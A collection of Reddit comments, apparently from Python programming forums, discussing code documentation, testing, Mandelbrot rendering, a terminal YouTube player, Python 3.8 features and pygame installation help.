What do you mean by at the function level vs process level? Sorry if that's very basic...
I just create aliases in `.bashrc` to `cd` to the directory. Later I made a Bash function to use in `.bashrc` that both defines a shell function/alias to go to the directory and also sets the same name as a shell variable holding the full path (functions and variables have different namespaces in Bash).
Ok what should I do instead?
I‚Äôve played with their free tier and it‚Äôs useful for experimentation. I could see that use growing if you are trying to develop remotely. The web deployment option is probably the biggest draw, but being that I already have AWS instances for that I haven‚Äôt bothered much with it. Also for remote development and project management I prefer google‚Äôs collabratorium, which may be worth a try. In general I really like Juypter notebooks.
looks beautiful :)
If you put it up on the cloud, expect to be hacked. Monitor your VM for signs of usage. A lot of times your VM will be added to a botnet for various schemes.
From the title I thought Craigslist had been caught using Car Finder's source code.
The VPN is internally developed. We‚Äôve got a nice little CLI to interface with.
Can‚Äôt tell if this was a mistake or a joke...
If your code is always clear enough to understand without documentation then you haven‚Äôt worked on anything remotely complex. It is essential to know why you added a flag to an object, when it is set and why; otherwise you are guaranteed to hit the same race condition over and over and over and your code will always be fragile and buggy.
anytime
&gt; Personally, I think Interface, Sales and Research documentation are obviously essential, depending on context Agree 100%. Implementation details should only be covered if they are not obvious, especially if they go against best practices or have unusual side effects. "Not obvious" includes somebody reading the code for the first time (but familiar with the language and used standard libraries). When I read a comment for a function I primarily want to know what it does and how to call it.
Easiest way would be a Flask app on pythonanywhere. You can get a basic page running in one click.
Alright, time to go back a little. Thanks for the feedbacks.

cool script! not really AI tho because it doesn't learn and get better at the game. but still a cool bot none the less. good job!
Cool project. Simple yet interesting. I enjoyed the video.
This is really cool! You must have worked really hard on this.
You want most of your tests to exercise tiny piece of self-contained code with no side-effects. Pure functions. For example a function that adds two numbers can be invoked with a representative sample of numbers in any order, or in parallel, and none of those invocations touch each other. But testing a piece of code that creates a file (a sideeffect) is harder - something needs to setup the initial state (ensure no file leftover from previous attempt) and cleanup afterwards. Plus needs to deal with the possibility of someone else (you, another program, another copy of the same test) doing that cleanup in the middle of the test. Your program likely has sideffects - otherwise it wouldn't be useful. You can easily test things like argument parsing and object sorting and pattern matching - probably all functions you can and inspect returned data. But then you probably want a small handful of end-to-end tests that run your program the way a human would - the cli with arguments in a new process - and observe intended sideffects. You may imagine that the end-to-end test would cover all the code tested by little (unit) tests. That's true. But if that big end-to-end test _fails_, the failure tells you very little about _where_ the problem is. The smaller the unit of testing the more precise your initial problem description when finding a bug. You may imagine that the pile of tiny unit tests would cover all the code tested by the large end-to-end (integration) tests. That's true. But if the program breaks while _none_ of the tiny tests fails, it's probably because there's an incorrect assumption about the interaction between those small pieces of well-tested code. So you test from both sides.
Thanks!
&amp;#x200B; &gt;If your code is always clear enough to understand without documentation then you haven‚Äôt worked on anything remotely complex. I don't know if i agree with that. We've all seen 300 lines of code projects that are horrendous to read and would require heavy documentation, and thousands of lines of code projects that read like a good book. I do believe that you can spare yourself a lot of documentation when you take the time to give your variables and functions explicit names, and when each function does a single thing. Nowadays, i don't fear being verbose in my variables/functions naming. This might seem weird, but it produces code that is non-ambiguous, and self-explanatory. Any time i feel that i need to add a comment, i think to myself "what is it that i did wrong to require a comment?". Well, i know that this is a controversial topic, and everyone has his own point of view, and his own experience about it. So it's not like someone is right, and the others are wrong. I think everyone has got a fair point.
start doing small projects , or web scrapping and read the book automating the booring stuffs
In almost 20 years of software development, from windows kernel drivers to larger Django projects, I disagree with you. It‚Äôs not even controversial. The controversy is about whether it is done not whether it should be done. Every sw engineer I know has written code that was perfectly clear the day they wrote it then a year later is like gibberish. Without the context in your head as to why you wrote something it‚Äôs nearly impossible to understand again with out a lot of time and often debugging. This is what the most trivial documentation helps to avoid.

It's easy to calculate the probabilities, the hard part is determining the hands of opponents based on their betting strategy. You could use it to assist you by card tracking (seen cards, and updating probabilities depending on those), but recognizing a bluff is going to be tough.

After one month of reading a book on python and not completing any of the projects in it, I think you can probably not worry about 'landing some money' anytime soon. You've taken a single, very small step on a long journey. Don't be planning your next career move just yet.
Hey, thanks for your outreach! Yeah amy level is fine. No intimidation or bs, ha! You could do google hangouts and brush up practice with other people. Its a new thing I started is all. Live free practice.
Hi Neoreeps. The example that you take, about writing something that seem clear at the moment, but that you can't understand when you come back to it some month/years later is a well known situation. We've all had some version of that and i **agree with you 100% on that part**. What i'm saying however, is that a verbose, well thought out name for variables and functions may negate the need for a comment. What i'm **trying** to write is code that is so self-explanatory that it can be understood by someone else at first glance. Code with more precise and explicit naming of variable and functions, such as to render documentation redundant. One thing that you haven't addressed is the slow drift that happens over time between what the documentation says and what the code actually does. Because having documentation is great, but when you documentation doesn't correspond to your code anymore, that's where ambiguity and bugs starts creeping in. You were talking about big projects earlier. Have you ever seen a big project were the documentation was convincingly reliable after a few years? I might not have as much experience as you, but what i've seen a lot of, is functions with names so obscure, or so ambiguous that they require documentation just for that, and documentation written by developer X that left the company 5 years ago, and though his original code was updated many times, the documentation was never changed. Realistically, that's what end up happening.
How long did it take you to make? Just wondering.

Yeah [here's a pastebin of it](https://pastebin.com/tjHZCgHc). I already export from Lightroom at my preferred image quality and 1080 px wide so not sure how it would handle larger images. I forget if I wrote it to resize or not. But should be pretty easy to add.
Yes but only with a disciplined team and clear process. For instance, in one of my teams no code review is approved without updated documentation AND unit tests. I concede that this is sadly not the norm.
I mean if you're making an Android app why wouldn't you? I thought that was what you were getting at.
Thank you
Have you looked through NLTK?
Lol, whatever happened to winamp?
Reminds me of MPD... Nice work!
Honestly not sure, it was a while ago. Not too often. I had it running periodically and dumping html copies of the listings that matched my criteria locally on my desktop for review. Since it was apartment searching there were a lot of duplicate items. It could have been because it was scraping through multiple pages rapidly whenever it ran.

Any reason not to just shell out to your system ping utility? Also do you mind me asking, is the goal to monitor your local isp or are you trying to draw conclusions about the overall availability of a site like google.com?

It seems like your program does not like to be given no playlist URL. If you press "OK" on the "New Playlist" screen without entering a URL, the program crashes
print('I just today {}'.format('started my first course'))
Nice idea, I like it a lot. If it's cool with you I might fork this at some point to dump it all into a DB and put a web frontend in front.
Nice to see. How long does it take to run as a function of `width*height`? If you eliminate the `if` in the `mandelbrot` function (by assigning `z[0]=0` at the start and using `range(1,80)`) does it run a little faster? Very little more effort to take width, height, output filename, even colors, from the command line. (But would probably double the lines of code...)
So I've looked at the codebase a little bit. - the structure_time function can be improved greatly by using string formatting (with the format method). `"{:0&gt;2d}:{:0&gt;2d}".format(minutes, seconds)` will format the time accordingly, you only need to change the template string based on if hours is equal to zero or not. - In the YoutubePlayer class, you use a lot of getter/setter methods, which are useless in python. I mean, all the attributes are public anyways in python, and you wrote the volume and index attributes without a leading underscore, which lead me to believe that you do not want those attributes to be "private". - The volume_up and volume_down functions are kinda weird. No argument to set the amount of volume up/down you want, it's always in increments of 10. - `if volume &gt; 100 or volume &lt; 0:` you could write `if 0 &lt; volume &lt; 100:` instead. - You can use the built-in max and min functions to clamp a value between two other values. `volume = max(min(volume, 100), 0)` will avoid your volume to go over 100 or under 0. - your UI classes do not follow proper naming conventions. This is not really a big deal overall, but still should be fixed. The naming convention is not even consistent accross your codebase. - You are using pickle to save the playlists. I find that a bit odd, as serializing the data into a human readable format like json would have been imo, more appropriate. You could also use lxml to save the playlist in the [XSPF](http://xspf.org/xspf-v1.html) format, or even the M3U format, so that the playlists can be used in other music players, like VLC. - You could make a Playlist object to handle the playlist itself instead of relying on dict attribute accessing. That would clean up the code a lot.

1) Create a Python file which calls spyder.exe and opens the workspace location of the child file. Let's call the parent foo.py and the child bar.py 2) Add this Python file to your PATH (env variables) 3) foo.py ./bar.py You can now call a file from anywhere in the terminal to open the child file in Spyder. I've done this with a couple other apps so let me know if you need any help.

Also... completely by chance I just ran onto, [mandelbrot for the BBC Micro](http://cowlark.com/2018-05-26-bogomandel/index.html) which led to [mandelbrot in 88 bytes of 8086 machine language](http://blog.nothinguntoward.eu/?p=38), and down the rabbit hole we go...

I don't believe Flask currently supports async. Something like Starlette or Quart might be more what you're looking for. Quart specifically is designed to work like Flask but using the new ASGI standard. https://gitlab.com/pgjones/quart

You'll probably use win32com to attach spyder.exe and os to transfer file paths. If not win32, try to find the executable file path and run it with arguments.

Jython use is an "Oh god, really, I've got to use this? Oh, well, if the alternative is really writing a script in Java, I guess I'll do it" situation. It's been dead for years, has no python 3 support, and has poor support in IDEs. But if you want to quickly strap together a few java libraries in a script, and have a strong preference for python over, say, scala, it's convenient enough. &amp;#x200B; CPython, on the other hand, is the reference implementation of the language, and therefore the most actively developed, most commonly used, most stable, and best supported version.
* Not a server * The bug is in a low probability to reproduce, so if we use debugger to run it probably end up with nothing * It's hard to tell if something goes wrong in the midst of the algorithm, but it's relatively easy to tell something is wrong by inspecting the end results. * So it would be helpful if we could easily capture and replay a group of the program states to reproduce the rare bug.

A 2D heatmap is just an image. Matplotlib can certainly display those, so you want to turn your data into a rectangle, just like the image you're trying to show. Either way, you'll be using numpy, python's near-ubiquitous array handling library. The naive way to do it is to make an empty array, then for each row of your data, index into the array at the given X and Y coordinates and set individual pixel values that way. However, if they're in a sensible order, you can just use numpy's `reshape` function to turn a 1D array-like thing into a 2D array.
If your goal is to just check connectivity, don't make HTTP requests, and do actually ping it, i.e. over ICMP.

i've literally never heard of such an expression, but thank you
&gt;It's a very thought out and wonderful project though. Couldn't agree more. Though new updates have slowed down over time, is still one of the best I have seen for multi-purpose usage.
that is weird, can you please attach a screenshot? Here's the url to pypi, pip should be able to find it: https://pypi.org/project/yTermPlayer/
yes, it crashes for now. I will fix it ASAP. There are many such things I still have to fix. Thank you for reminding me.

Both youtube-viewer and mps-youtube offer a wide range of features. But I didn't like the UI of any of them. I loved mpd-ncmpcpp UI ricers used so decided to make something similar. Also, both of those allow video streaming and browsing while my software is specifically for streaming youtube playlists as audio. Honestly, you might as well call this a watered down version of those two.
The volume up and down functions were added by someone else in a latest commit, I didn't see it through properly. It's my mistake ultimately. I didn't know about XSPF, i will look into it, thank you. I am considerably new to python programming, I tried following PEP conventions but I guess I failed. I will fix the naming conventions ASAP also, I am already working on making a playlist object, you got me here! Thank you for your suggestions, this was very helpful, I will read through your fork in a while.
thanks for clarification ..love projects like this, gl
Thanks for the heads up! I know zooming in is the next step once someone get's into Mandelbrots and thus optimization of rendering time would super helpful. I tried your idea to eliminate the ```if function```, assign ```z[0]=0``` and using ```range(1,80)``` and the runtime was indeed a couple seconds faster on average! ```--- 18.021141052246094 seconds --- vs --- 15.923664569854736 seconds ---``` To incorporate the other one you talk about with flood-filling will take some time, but i'm excited to try it out and see the results. Sounds like you have some experience with this fractal stuff! :-)
you automated everything except having to type it each day! come on man get with the game!
Awesome! I was inspired by a youtube video to code the Mandelbrot set. Then I discovered fractals and I've been coding them a lot, not only are they fun, they also help me get more familiar with recursion. How about coding [Buddhabrot set](https://en.wikipedia.org/wiki/Buddhabrot) now? (Beware though, it's computationally very expensive)
**Buddhabrot** The Buddhabrot is a fractal rendering technique related to the Mandelbrot set. Its name reflects its pareidolic resemblance to classical depictions of Gautama Buddha, seated in a meditation pose with a forehead mark (tikka) and traditional topknot (ushnisha). *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/Python/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.28
Yes!! Buddhabrots are what got me into this actually!! So yesterday was when I saw the r/Python post from like a month ago on Mandelbrots, and one of the comments suggested Buddhabrots so I looked into that, it blew my mind!! The Wikipedia page especially with the cool rendering GIF's. I tried my hand at understanding it because it was my goal to code it and render it. I couldn't understand anything!! So I decided to take a step back and try my hand at Mandelbrots as it was heralded as an easier project. I didn't realize I'd have so much fun, and yes definitely will tackle Buddhabrot after this.
Good luck! You have many more interesting fractals waiting for you after Buddhabrot, its a long fun road.
Yeah, it's (minor) annoying to have to answer "is it still available". At least say something like "if it's still available I'd like to take a look at it on Monday between hours x and y. Does that work for you?". Then we'd be on to the substance right away instead of the pointless "still available?" messages.
It's also very domain specific - there are some tasks that require such a fiddly solution that there's zero chance of someone following without some sort of help. In some cases, for me, that would be heavy documentation, in some cases comments. &amp;#x200B; But in general, I agree with your comment quite a lot.
Great to have your views here. What form does your documentation take, for instance when trying to make sure people understand why a flag is required? Is it a full technical spec (which wouldn't necessarily actually explain that, since the main requirement is to allow the code to be replicated, depending on stuff), or is it heavy comments within the code, or is it a [README.md](https://README.md) in the same repo, or what?
I've definitely seen documentation rendered useless by people not being rigorous enough about updating it.
This is definitely not an either-or situation. I would agree that if you're writing operating system components, or django, much heavier documentation is required than if you're writing a charting library, for instance, because the potential for being audited, or messing up someone's day is higher, and the overall task is more complicated.
If you want another challenge try to zoom in on a specific part of the Mandelbrot set ( Using coordinates from a YouTube video such as [this one](https://youtu.be/foxD6ZQlnlU) ) the designs get more and more intricate
I wrote a Mandelbrot renderer in Turbo Pascal on a 486sx processor back in like 1995. Seeing how slow it rendered compared to Fractint sent me on pretty cool learning experience when I was 17 to understand why my floating point implementation was so much slower. The 486sx didn't have a FPU so floating point had to be done in software. Fractint had optimizations that scaled everything to integer arithmetic to avoid floating point math. I'm guessing that's where the name came from, but this was back before the web is what is today so it was harder to find answers to things.
If you need (or would like to use) an async web framework, you should try [Sanic](https://github.com/huge-success/sanic). It has a 12k+ stars on GitHub and it gives you a Flask-like API (though there are some major differences). It has a `HTTPMethodView` [class](https://sanic.readthedocs.io/en/latest/sanic/class_based_views.html) that lets you write RESTful APIs with a class syntax. For documenting your API, you could try [Sanic-OpenAPI](https://github.com/huge-success/sanic-openapi).
you i love you
I painfully use java to access the android api, and objective-c to access the ios api but otherwise use C++. Swift and Kotlin are just some nitwits trying to charge me a mental tax to go to their fairground. Yuck.
For anything http related I would stick to *requests* - one of the best 3rd party module ever.
I just saw an 8 minute zoom in on reddit. I think it went up to like 1e200 X zoom. [https://www.reddit.com/r/oddlysatisfying/comments/9kec64/the_mandelbrot_set/](https://www.reddit.com/r/oddlysatisfying/comments/9kec64/the_mandelbrot_set/) Freaking crazy! I am totally going to look into how to do zoom ins.
&gt; FPU Never even heard of that, I had to look it up. A floating point unit it is? Computers are getting so complex these days lol, I think we have thrown so many things into the CPU we've lost track. I think i read something called the ALU, arithmetic logic unit? I'm guess that is part of the CPU too now. &gt; 1995 That's about the time I was born, lol. Do you recall how long the render time was on the 486sx processsor? Hours? Weeks? Also, do you recall the size of the picture output?
To make it slightly faster you can also use numba: from numba import jit import numpy as np @jit(nopython=True) def check_convergence(z, max_n=80, divergence_limit=20): for n in range(max_n): z = z ** 2 if abs(z) &gt; divergence_limit: return n return 0 @jit(nopython=True) def test(rstart, rend,rstep, istart, iend, istep): for r in np.arange(rstart, rend, rstep): for i in np.arange(istart, iend, istep): z = complex(r, i) n = check_convergence(z) # with numba In [33]: %time test(-1, 1, .002, -1, 1, .002) CPU times: user 672 ms, sys: 9.44 ms, total: 681 ms Wall time: 684 ms # without numba In [35]: %time test(-1, 1, .002, -1, 1, .002) CPU times: user 11.2 s, sys: 8.47 ms, total: 11.2 s Wall time: 11.3 s you can't use fancy objects though..
Am I understanding this right? It reduces render time from 11.2 s to 0.68 s ? That's a HUGE improvement!
Thread(target = func1).start() time.sleep(1) Thread(target = func2).start()
Thats correct :) &gt; [Numba](https://numba.pydata.org/) translates Python functions to optimized machine code at runtime using the industry-standard LLVM compiler library.
Without FPU, it took a few minutes to render. It's not intractable math, just faster in hardware than software. I upgraded to a 486DX which had FPU and it rendered in under a minute. I got lucky that my Packard Bell (lol) was upward compatible because I had no idea what I was doing at the time. I just changed the processor and it worked, but in retrospect it needed a heatsink or better ventilation because it would mysteriously lock up on me. Another problem with floating point arithmetic is the farther in you zoom, the less accurate resolution you have when testing whether something is in the set or not. I'm guessing I was using 32-bit floats at the time, 64-bit doubles may have let me zoom in further than I ever needed to. You have to apply some similar scaling tricks to what Fractint is doing if you want to retain resolution the further in you zoom. Definitely look into Fractint if you haven't. I don't know if it's open source now, but it was definitely a pioneer in 'freeware' distribution that preceded a lot of open source models.
It's stating that it can't find the pygame module. Try 'pip install pygame' and then 'python projectname'
Your function mandelbrot(c) returns a value between 1 and 79 inclusive. therefore this line isn't doing anything: if n != 80:
For something like this I'd recommend either the requests library as you can store the status_code of the site quite easily, e.g. 200 for up, 403 for forbidden, etc. The other way would be to create a virtual socket and ping up or down for availability. Unfortunately I don't have enough experience with UrlLib or HTTP client so can't help with recommendations there!
I've already done the pop install pygame. &amp;#x200B; Is the 'python projectname' command also done through command prompt?
Please check your interpreter and its folder. Is there a file related to pygame? I received this error once while using pycharm, and I solved it by uninstalling and reinstalling pygame. But it was a so specific case. I think this is about between the interpreter and pygame.
I to am using Pycharm, I will look and see if there is a folder now.

Hahahhaa, Yes see my first sentence! I knew I was treading on thin ice with this post but as someone who learned about Mandelbrots for the first time, like actually really learn about it, the Eureka feeling was overwhelmingly awesome.
Thank you.
Thanks! I will pm you if you don't mind if I get stuck on the Buddhabrot Journey
Better run a trace on it.
Haha, I literally just started working on a similar app with Django and SQLite. I like to track things but many apps are too much for my needs so why not build it exactly how I want it.
sure! I don't mind at all.
If you're interested in tackling challenging computer-sciency type problems, you could take a look at project Euler. If you want to see something blindingly mind blowing, try this on for size: [https://www.geeksforgeeks.org/julia-fractal-python/](https://www.geeksforgeeks.org/julia-fractal-python/) This guy made a minecraft clone in less than 1000 LOC: [https://github.com/fogleman/Minecraft](https://github.com/fogleman/Minecraft) I should probably think of an example of something legitimately useful... *hmmmmm*
This is much too vague. For example, how do we know that you're not just going to claim the data is of "poor quality" and low ball us? Tell me more about what you need, who you need scraped, and I'll get back to you if I can produce a result. Also, how many numbers do you expect to get out of this? What is your offer per phone number?
Indeed. NHS Digital's Spine system is written in Python, as are a number of other national systems, including the one I work on in my day job. Although admittedly, local systems are more often dotnet.
I cant seem to find any files for it and have tried uninstalling and reinstalling several times
I'm personally not a fan of the way the settings are done, I know it's a common way of doing things, but the import * is what I hate about it. I wouldn't allow it in a code review normally and we've found our own ways to work around it, better ways to achieve the same thing without import * Why is import * bad, because PyFlakes can't run properly, it can't track unused imports anymore if you import everything.
Hm, didn't think about that. ü§î
Yeah for me it's mostly about how fast you can update the numbers for planning purposes. I want to be able to hit an up arrow to increase some ingredient by one gram and immediately see how that affects the totals and ratios for the recipe, meal, and the whole day. I haven't seen that anywhere.

Usually processors for desktop have higher clock speeds, so if your code is single threaded it is expected to run a bit slower (i wouldnt expect that much of a difference though). OS can also make a difference, do you use the same one in both machines.
use for loops to color the pixels is inefficient. try use ogrid and numpy.frompyfunc to accelaterate this. see [here](https://github.com/neozhaoliang/pywonderland/blob/master/src/misc/mandelbrot.py)
Well what does the Code do? Any specifics about the architecture of it?
The best way is to parametrize the equation, i.e. express both x and y in terms of one variable. For x^2 + y^2 = c, this is a circle, which can be parametrized as x = sqrt (c)* cos (t), y = sqrt (c)*sin (t). So make a for loop (for t in range 0 to 200 should do) and make a list of x_values and y‚Ç¨values, given the above equations. Then do plt.plot(x_values,y_values) (assuming you've imported matplotlib.pyplot as plt) Then plt.show (), and you should see your plot.
yes I use windows 10 v1903 on my laptop and win10 v1810 on my desktop &amp;#x200B; I also think the clock speed wouldn't make that difference
I use these codes to plot some figures in my paper, &amp;#x200B; just simple combination of normal matplotlib commands
Yes, but replace project name with the name of the project you want to launch
The laptop cpu has a way lower baseclock
If you have multiple versions of python installed you may need to pip install for the correct python; I do this just by calling pip through the python I'm interested in, e.g., "sudo -H python3 -m pip install &lt;package name&gt;" if I want to pip install for python 3.
You should reinstall python, looks like an intern error

Hi! Sure, it's possible. In my opinion, Python is easy to get started with, but the more you dive into it, the more you will have to learn. I wouldn't start learning Python by immediately trying to create a GUI app (especially as GUI programming is not the strongest point of Python). Take one step a time, first familiarize yourself with the language by creating terminal applications. Once you have a foundation, you could get started with a GUI application. For the GUI part, i recommend [kivy](https://kivy.org/#home) or [QT for Python](https://www.qt.io/qt-for-python) (aka PySide2). Here is a very simple [kivy application](https://github.com/volfpeter/codenames-kivy) i wrote a while ago, feel free to have a look at its code.
Import of lbraries can be very slow. I suggest you take times on second run of the script in the same shell (if you aren't already doing it). &amp;#x200B; Also OS may affect timings: if you are using matplotlib, this involves opening graphical windows, and can be slowere with some backends on different OSes. Also reading/writing data from/to a file or internet connection can make huge time differences
[Article linked on bottom](http://james-iry.blogspot.com/2009/05/brief-incomplete-and-mostly-wrong.html) of that article is in my opinion way funnier and spot-on

Question: doesn't mandlebrot(c) return n no matter what?

There are no better-than-chance publically-disclosed algorithms for any form of financial gambling.
Yes the name rings a bell being because it used fixed point math. I've used this somewhat recently in [x86 assembler](https://www.reddit.com/r/asm/comments/8o8c0b/mandelbrot_x86_asm_w_vga/)
Try the previous version for 3.7 (3.7.¬≤ I think). I had a problem too with the most recent version, bit it was a bit different
how that conversion happens. please explain if possible
also how to code it
Yeah dude go ahead
What is your interpreter's folder in Pycharm? And please check Scripts folder for pygame.exe or /lib/site-packages for pygame folder.
Eh. Laziness only got me so far. Plus the catharsis can't be ignored.
Maybe a linear system much more than just one equation.

it seems that you are passing the folder "Python 3.7" as argument to python.exe. There is no module __main__.py in that folder, that's the error message.

When you can tell me the factors why Bitcoin goes up or down when it does, even after the fact, you might have something. AFAICT, you might as well predict a RNG. I've asked "experts" to explain why the market rises and falls. Every other commodity market can do so. The dollar fell to the yen overnight? You bet there's a reason given. GM stock is up 10% overnight? Not hard to find out why. Bitcoin goes 20k-&gt;5k-&gt;13k-&gt;11k? Fluctuations. Nothing more.
I've seen these videos starting popping up on youtube some month ago. I actually watch some of them (and now i'm on reddit), so i think it's a good idea. Especially when you see the views they make (in the x \* 100k views). So, maybe you can make an income out of it. I was thinking about doing something like that as well, but wasn't sure how to proceed. Just one comment thought: I don't think that finding the best post on a (hardcoded) subreddit necessarily makes sense, because the topic might be uninteresting (despite the success of the post), and the topic might be too controversial to make a video out of it. What about having your scritpt produce a list of the best posts of the last day, in a variety of subreddits, then with that list, manually choose the one that has the most potential, and feed the URL of that post to your script that will extract the comments?
I think this has been answered but here's an amazing article on mocking that I reference all the time [here](https://link.medium.com/ddJcIUCbYX).

Ugh. With that f-string equals evaluator, can you escape it out? Like, \=?
You can write this in a day using [PySimpleGUI](http://www.PySimpleGUI.org). Definitely more time required learning tkinter or Qt than PySimpleGUI. You can still get the look and feel of these GUI frameworks. PySimpleGUI runs as a wrapper for several of them (tkinter, Qt, WxPython, and Remi for browser UIs) so under the code you write runs the same GUI engines you would otherwise be writing code directly for. Here is code to show a window with a list of random strings (a bit of what you want to do). import PySimpleGUI as sg import string, random list_to_display = [''.join(random.choice(string.ascii_letters) for _ in range(random.randint(6, 18))) for n in range(20)] # a random list of strings layout = [[sg.Listbox(list_to_display, size=(20,4))]] # the window layout window = sg.Window('Window with listbox', layout) # make the window event, values = window.Read() # show window and get events And the window it makes is: [https://user-images.githubusercontent.com/13696193/60442742-b650a580-9be7-11e9-814a-8e3dd6ba8ad4.png](https://user-images.githubusercontent.com/13696193/60442742-b650a580-9be7-11e9-814a-8e3dd6ba8ad4.png)
The f-string example is incorrect. According to the example in the [What's New docs](https://docs.python.org/3.8/whatsnew/3.8.html), it would print `input-output=50`. On the left-hand side of the equals, the expression is not evaluated at all.
Most likely your PyCharm instance is running a different Python interpreter from your terminal. Open the project settings, find the Project Interpreter, and check the list of installed packages for your current interpreter. If Pygame is not there, install it using the PyCharm GUI just to be sure :)

The code you linked looks super optimized, I got to study how they did it and hopefully write Python code like that myself one day. Like this part here ```R, G, B = np.asarray(np.frompyfunc(iterate, 1, 3)(z)).astype(np.float)``` I think I read that as a Multiple Assignment trick? I'm still learning all the little minute nuances about the Python language.
Thank you!
Man this thing looks really awesome. Also looks like you are running the Arch Linux Distro?
Hmm, that would be one way to generate income via programming knowledge.. creative.
That is truly beautful, thanks for sharing!
It's incorrect about assignment expressions not being allowed in comprehensions as well.
There was an indentation error on line 196 of BinBot.py : ``` print("Valid Path...") if workpath.endswith('\\'): pass ```
Why would you have a limited time to decide on a career? That's not something you should be rushing.
Thanks for that. It should save the output to whatever directory is specified as workpath in the beginning, because when saving the files it adds workpath to the beginning of the filename when opening the files to write to. The only time it SHOULD save to the current directory is if the user enters ‚Äòcurdir‚Äô for the workpath variable.
What? It has always been possible to use `@functools.lru_cache` as a decorator. The only difference is that you no longer need to write `@functools.lru_cache()`, you can leave out the parentheses. I think the author of that article misread the changelog.

Number 5 ("Reversed(sequence) Is Introduced") seems to be wrong? The only thing in the 3.8 changelog that has "reverse" in it is "bpo-35224: Reverse evaluation order of key: value in dict comprehensions as proposed in PEP 572. I.e. in {k: v for ...}, k will be evaluated before v." That is: &gt;&gt;&gt; #In Python 3.7: &gt;&gt;&gt; {print('key'): print('value') for _ in range(1)} value key {None: None} &gt;&gt;&gt; #In Python 3.8: &gt;&gt;&gt; {print('key'): print('value') for _ in range(1)} key value {None: None}
What lead you to believe the CPU was the bottleneck? What does the task manager performance tab display as CPU utilization while the script is running?

You could use something like Pycharm if you really don‚Äôt want to work in the terminal. I‚Äôd suggest getting familiar with the terminal though.

Most OSs support command history where you press up to go through the previous commands. That‚Äôs how I develop everything I do.
Why would you need to escape it?

So 1-3 are anti-features as far as I'm concerned. I actively don't what them. 4 is a library tweak. `lru_cache` could already be used as a decorator, but the why it was written was slightly different (and more generic). Why make `lru_cache` special? 5 sounds like the only desirable feature, but that's only because dictionaries have recently become ordered. Most code doesn't assume that, so reversing the iterator doesn't matter.
The newer article completely ripped off the old one

On 18.04 `sudo apt install python3.7` should work.
I experienced a similar problem plotting individual PLZ of Germany (zip/postal codes, of which there are \~15k). I found the fastest route was to bypass Cartopy entirely and use the same approach as GeoPandas, using descartes and shapely. Pertenent example: reader = shapefile.Reader(PLZ5) for shr in reader.iterShapeRecords(): ax.add_patch(PolygonPatch( shr.shape.__geo_interface__, fc=colour_map.get(shr.record[2], 'lightgrey'), ec=colour_map.get(shr.record[2], 'lightgrey'), linewidth=line_width )) It turned out that the majority of the time was spent altering the projection, which at the scale I was working at wasn't important. (Any or all of this might not be helpful or any faster than the suggested approach, but it was the fastest I found!) One other thing to mention--the shapefiles I was working with were unnecessarily detailed, and minimising the number of points in each polygon had a significant performance impact. I used ArcGIS for this, and of course it was only necessary to create a new shapefile once.
I like the terminal that my computer provides, Terminal on Macbook Pro (OSX High Sierra), but running programs from IDLE doesn't run them in this Terminal, it uses a custom terminal. Are there any IDE's like IDLE that run programs in your computer's default terminal automatically?
&gt; On a side note I also found out the website I use to access my schedule also has everyone's schedule for the entire week which I can access. Great, now you can stalk people.
Yea that's exactly what I thought but I've emailed the company to let them know about it because I'm sure it must break some data protection.

Not a single mention about John McCarthy and Lisp in the 60s? That guy gave us cond (if-else), dynamic typing, garbage collector, real macros!
Thank you. :-) It is very beautiful natural pattern indeed!
Awesome! One day I will learn how to install Arch linux lol
These stupid assignmet expressions! Why introduce a new syntax change in a minor version? Stupid decision imo.
I mean, there's an entire section in PEP 572 about how assignment expressions can be used to simply listcomps. I have to assume that the author didn't even bother to read it.
and then look busy for a few hours!
4chan has a nice json API if you append .json to a thread url btw.

It seems like the Medium article did a bit of the schoolkid "copy it but change it a little so it doesn't look like plagiarism": (bold is mine) &gt;Blogspot: Ada Lovelace writes the first program. **She is hampered in her efforts by the minor inconvenience that she doesn't have any actual computers to run her code.** &gt; &gt;Medium: Ada Lovelace gets bored of being noble and scribbles in a notebook what will later be known as the first published computer program, **only slightly inconvenienced by the fact that there were no computers around at the time.** &amp;#x200B; &gt;Blogspot: **Alan Turing invents every programming language that will ever be** but is shanghaied by British Intelligence to be 007 before he can patent them. &gt; &gt;Medium: **Alan Turing invents everything**, the British courts do not approve and have him chemically castrated. That said, besides the people and events throughout the articles being almost identical, the writing about the events begins to differ. Also, the Medium article has a few more modern examples.
Please add Margaret Hamilton to your list of real heros. Also, the people you hang out with, what fake female heros are they lauding specifically?
I don't really like the Assignment Expressions and think it pollutes the language to add little syntax gizmos and degrades the intuitive readability.
Sigh... I‚Äôm diligently working my way through learning python. This is the kind of thing got me interested to begin with. I‚Äôll get there, but first... on to dictionaries!

More general than Python, but once a year Immunity offers a Web Hacking course. The last two days require quite a bit of Python (SQLi automation, and crypto). [https://immunityinc.com/education/web-hacking.html](https://immunityinc.com/education/web-hacking.html) Disclaimer: I'm one of the instructors. Python is very popular in the security industry.
Yes I mean to add it to the neverending list of things I want to do haha. I'll get to it one day I'm sure.
Nice! I grew up with only the CLI (DOS) so this is like reliving my childhood.
&gt;diligently working my way through learning python. When did you start learning Python? &gt;on to dictionaries! They are interesting aren't they? It's got both a key and value. I'm still wrapping my head around iterating through dictionaries I mean, we have all gotten used to ONE variable ```for i in variableName:``` but iterating through TWO variables? ```for k,v in variableName.items():``` I still need to go back and reference the book ["Automate the boring stuff with python"](https://automatetheboringstuff.com/chapter5/) for stuff like this.
I thought the whole point of fstrings is that you could use variables and text together seemlessly. I get that you could do print(f"valone+valtwo" + "=") (but, in my suggestion, I was going to say you could maybe do print (f"valone+valtwo\\=")) but if we're going that far, why not just get rid of this esoteric usage of = in the fstrings? I guess maybe I just missed the point. &amp;#x200B; I've always seen fstrings as an alternative to sprintf, for example, rather than as a "look, a cool way of evaluating variables on same line".
I got a good chuckle out of that article. OP should have linked that one instead of the Medium article.

No it's not. You can, of course, hit the arrow multiple times or hit PgUp/PgDn for 10 at a time. But that's not the point. Point is to easily make changes in the planning phase and immediately see how it affects the numbers for the component, meal, and day.
